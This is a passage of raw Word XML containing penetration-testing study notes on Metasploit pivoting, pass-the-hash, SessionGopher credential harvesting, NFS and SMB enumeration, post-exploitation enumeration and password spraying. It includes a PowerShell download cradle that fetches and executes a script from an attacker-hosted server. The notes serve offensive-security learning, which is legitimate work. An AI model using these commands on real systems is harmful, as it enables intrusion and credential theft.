        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Test 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print</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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Forward tools through the session;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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auxiliary/server/socks4a</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4A8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Uses routing table set in metasploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Now; have to use a tool to redirect all traffic through a proxy (proxychains)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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br w:type="textWrapping"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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ow1bsyze2mr2" w:id="162"/>
        <w:bookmarkEnd w:id="16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Exploitation through Pivoting </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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A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Hashdump </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004A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 the hash with the use exploit/windows/windows; payload, lhost, rhost, smbpass (hash, pass-the-hash)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004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B0">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mlw4blxxs8fn" w:id="163"/>
        <w:bookmarkEnd w:id="16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(Meterpreter SSL Certificate Impersonation and Detection and Evasion)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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Using python http server to get fields one server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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Python -m SimpleHTTPServer 80 ← attacker machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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Iex (new-object …..) ← powershell download on victim</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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auxiliary/gather/imersonate_ssl --  requests a copy of certificate from site</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Set rhosts as </w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:instrText xml:space="preserve">HYPERLINK "http://www.microsoft.com"</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www.microsoft.com</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="120"/>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Creates a pem file and crt</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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B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e4s1if5vb8a" w:id="164"/>
        <w:bookmarkEnd w:id="16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(SEssion Gopher, obtaining credentials)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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Download github.com/fireeye/SessionGopher  to  attacker system</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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Then execute on victim machine , remote to victim</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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python -m simplehttpserver 80</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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victim ps cradle to run function in ps1 script</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004B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B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Powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadString(‘</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:instrText xml:space="preserve">HYPERLINK "http://simplehttpserverip/FILE"</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http://SIMPLEHTTPSERVERIP/FILE</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Invoke-SessionGopher</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004BF">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="32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voieesss8qv" w:id="165"/>
        <w:bookmarkEnd w:id="16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Exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C0">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vx9xhab7on3" w:id="166"/>
        <w:bookmarkEnd w:id="16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Information Gathering</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C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vo96oock65i" w:id="167"/>
        <w:bookmarkEnd w:id="16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Remote Enumeration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C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-O --osscan-guess IP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C3">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r4e3yfxasvd" w:id="168"/>
        <w:bookmarkEnd w:id="16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NFS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C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Network File System (NFS) - RPC, remote procedure call,  based file sharing protocol on NIX systems. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C5">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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tcp/udp → port 2049</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Configure ‘export’ directories -- /etc/exports</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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queries </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="54"/>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Nfs-ls </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="54"/>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Nfs-showmount</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004CA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="54"/>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Nfs-statfs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004CB">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Showmount -e ip</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C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Exploiting misconfiguration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004CD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Make a directory: mkdir -p /mnt/home/bob</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004CE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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mount  the directory: mount -t nfs [ip]:/remote/folder mnt/home/bob -o nolock</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004C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D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g2wxtaxnaid" w:id="169"/>
        <w:bookmarkEnd w:id="16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Portmapper (rpc bind)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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Service found on nix machines to map a remote procedure call.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="126"/>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 tcp/udp 111, 32771, enumerated with nmap or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rpcinfo</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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D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D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0268bicrgjb" w:id="170"/>
        <w:bookmarkEnd w:id="17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Samba</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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Print and file sharing services for windows classes, smb/cifs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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 -- Name-service -- 137</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D9">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Netbios -- datagram service -- 138</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004DA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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 -- 139</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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 -- script smb-enum-shares</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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Smbmap → enum</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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Smbclient → \\\\ip\\share</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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Mount folders → mount, requires cifs-utils package</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004D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E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samba shares</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Rpcclient → uses potential list of usernames</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E2">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Bash script OR lookupnames </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E3">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Enum4linux</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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7odnwtrmqwbf" w:id="171"/>
        <w:bookmarkEnd w:id="171"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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odnwtrmqwbf" w:id="171"/>
        <w:bookmarkEnd w:id="17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Enumerating SMTP Users</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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Sendmail, postfix, exim, microsoft exchange</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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 --script smtp-commands</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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Telnet to server → HELO ‘domainname.com’ etc, or smtp-user-enum</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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E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ucug0axk70b" w:id="172"/>
        <w:bookmarkEnd w:id="17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LOCAL Enumeration (POST exploit)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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Ifconfig -a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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-n </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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Traceroute -n ip → how many hops to compromised machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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 Resolution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/etc/resolv.conf</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004E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Arp -en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information on who communication with is happening </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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Netstat -auntp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same info from the /proc/net/tcp and udp files\</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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 -twurp</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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-l</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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if outbound port connectivity is possible → nmap to portquiz.net</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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22733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ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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F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28575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rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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3086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ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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4F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suid files etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004F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q2idvll106d" w:id="173"/>
        <w:bookmarkEnd w:id="17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Information gathering tools and resources</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004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 → </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004FC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Linenum</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004FD">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Linuxprivchecker</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004FE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Unix-privesc-check</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000004FF">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>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Mimipenguin</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000500">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dvx80jpdtea6" w:id="174"/>
        <w:bookmarkEnd w:id="17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 Information Gathering)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050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Nmap, services, user enumeration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050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Linuxprivchecker → written in python, python linuxprivchecker.py &gt; filename</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000503">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Sudoers privileges</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000504">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>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 has a shell escape !sh</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000505">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>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Id</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000506">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="12"/>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50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0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09">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lzeo4uoh908" w:id="175"/>
        <w:bookmarkEnd w:id="17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Remote Exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050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d0yh1nbz6y9" w:id="176"/>
        <w:bookmarkEnd w:id="17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Password Spray</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050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Many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on a single password, stops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lockouts</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Enumerate users first</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1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Statistically likely usernames</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1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Smtp enumer users , metasploit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smtp_enum</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000050F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1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 harvester  (find naming convention  of a particular site)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000510">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Choose single (mabye 2) passwords to attempts</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000511">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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services running to spray against</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000512">
      <w:pPr>
